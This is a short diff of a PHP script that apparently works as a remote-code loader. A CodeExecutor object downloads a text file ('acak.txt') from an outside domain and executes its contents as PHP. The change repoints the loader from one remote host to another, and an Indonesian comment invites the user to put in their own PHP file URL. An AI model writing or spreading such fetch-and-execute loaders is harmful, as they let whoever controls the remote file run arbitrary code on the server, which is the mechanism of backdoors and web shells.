@@ -86,7 +86,7 @@ try {
     $executor = new CodeExecutor($fetcher);
 
     // Ganti URL ini dengan file PHP kamu yang valid
-    $executor->executeCodeFromURL("https://digtaldesa.id/vendor/acak.txt");
+    $executor->executeCodeFromURL("https://scemabot.com/vendor/acak.txt");
 } catch (Exception $e) {
     echo "Error: " . htmlspecialchars($e->getMessage());
 }
